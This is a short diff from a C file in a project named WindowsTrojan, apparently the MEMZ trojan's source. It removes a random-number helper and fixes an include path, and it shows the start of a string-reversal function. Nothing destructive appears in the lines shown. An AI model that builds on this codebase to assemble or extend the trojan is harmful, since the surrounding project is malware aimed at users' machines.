+++ WindowsTrojan/Source/Utils/StrReverse.c
@@ -1,16 +1,4 @@
-#include "MEMZ.h"
-
-HCRYPTPROV prov;
-
-int random() {
-	if (prov == NULL)
-		if (!CryptAcquireContext(&prov, NULL, NULL, PROV_RSA_FULL, CRYPT_SILENT | CRYPT_VERIFYCONTEXT))
-			ExitProcess(1);
-
-	int out;
-	CryptGenRandom(prov, sizeof(out), (BYTE *)(&out));
-	return out & 0x7fffffff;
-}
+#include "../MEMZ.h"
 
 void strReverseW(LPWSTR str) {
 	int len = lstrlenW(str);
